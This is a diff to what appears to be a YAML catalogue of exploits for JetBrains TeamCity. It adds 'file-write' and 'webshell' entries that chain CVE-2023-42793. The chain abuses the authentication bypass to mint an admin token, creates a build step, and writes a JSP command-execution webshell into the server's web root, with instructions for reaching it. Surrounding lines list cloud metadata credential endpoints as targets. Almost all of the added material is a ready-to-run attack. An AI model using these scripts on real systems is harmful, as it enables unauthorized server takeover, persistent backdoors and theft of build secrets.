@@ -102,6 +102,43 @@ functions:
       unauthenticated:
     version: |
       < 2023.05.4
+  file-write:
+  - code: |
+      # CVE-2023-42793: write arbitrary files on the agent host via a build step
+      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
+        -H "Content-Type: application/json" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+
+      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"fw","id":"fw","parentProject":{"locator":"_Root"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"fw","id":"Fw_Fw","project":{"id":"fw"}}'
+
+      # Write a JSP webshell to the TeamCity server web root:
+      SHELL='<%@ page import="java.io.*" %><%String c=request.getParameter("c");if(c!=null){String[] a={"/bin/sh","-c",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:Fw_Fw/steps" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d "{\"type\":\"simpleRunner\",\"name\":\"fw\",\"properties\":{\"property\":[{\"name\":\"use.custom.script\",\"value\":\"true\"},{\"name\":\"script.content\",\"value\":\"echo '${SHELL}' > /opt/teamcity/webapps/ROOT/shell.jsp\"}]}}"
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"buildType":{"id":"Fw_Fw"}}'
+    comment: "CVE-2023-42793: writes arbitrary files to the agent (or server if co-located)\
+      \ via a\nCommand Line build step. The path /opt/teamcity/webapps/ROOT/ is the\
+      \ TeamCity embedded\nTomcat web root \u2014 files dropped here are served directly\
+      \ by the TeamCity HTTP listener.\nVerify the exact path with the file-read entry\
+      \ targeting /proc/1/cmdline.\nAfter the build completes, access the webshell\
+      \ at: http://victim.com:8111/shell.jsp?c=id\nIn production setups where the\
+      \ agent runs on a separate host, adjust the path to a\nwriteable location on\
+      \ the agent (e.g., /tmp, the agent workspace).\n"
+    contexts:
+      unauthenticated:
+    version: |
+      < 2023.05.4
   rce:
   - code: "# CVE-2023-42793: auth bypass \u2192 admin token \u2192 RCE via build runner\n\
       \n# Step 1: create an admin API token without authentication\nTOKEN=$(curl -s\
@@ -247,6 +284,40 @@ functions:
       - AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
       - GCP:        http://metadata.google.internal/computeMetadata/v1/
       - Azure:      http://169.254.169.254/metadata/instance?api-version=2021-02-01
+    contexts:
+      unauthenticated:
+    version: |
+      < 2023.05.4
+  webshell:
+  - code: |
+      # CVE-2023-42793: deploy a JSP webshell to TeamCity's embedded Tomcat web root
+      TOKEN=$(curl -s -X POST "http://victim.com:8111/app/rest/users/id:1/tokens/RPC2" \
+        -H "Content-Type: application/json" \
+        | python3 -c "import sys,json; print(json.load(sys.stdin)['value'])")
+
+      curl -s -X POST "http://victim.com:8111/app/rest/projects" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"ws","id":"ws","parentProject":{"locator":"_Root"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"name":"ws","id":"Ws_Ws","project":{"id":"ws"}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildTypes/id:Ws_Ws/steps" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"type":"simpleRunner","name":"ws","properties":{"property":[{"name":"use.custom.script","value":"true"},{"name":"script.content","value":"printf '"'"'<%@ page import=\"java.io.*\" %><%String c=request.getParameter(\"c\");if(c!=null){String[] a={\"/bin/sh\",\"-c\",c};Process p=Runtime.getRuntime().exec(a);out.print(new String(p.getInputStream().readAllBytes()));}%>'"'"' > /opt/teamcity/webapps/ROOT/shell.jsp"}]}}'
+
+      curl -s -X POST "http://victim.com:8111/app/rest/buildQueue" \
+        -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
+        -d '{"buildType":{"id":"Ws_Ws"}}'
+
+      echo "[*] Shell at: http://victim.com:8111/shell.jsp?c=id"
+    comment: |
+      CVE-2023-42793: deploys a persistent JSP webshell to TeamCity's embedded Tomcat web root
+      via a Command Line build step. The default installation path on Linux is
+      /opt/teamcity/webapps/ROOT/. Verify with the file-read entry targeting /proc/1/cmdline.
+      The webshell survives TeamCity restarts until the file is manually removed.
+      Access at: http://victim.com:8111/shell.jsp?c=id
     contexts:
       unauthenticated:
     version: |
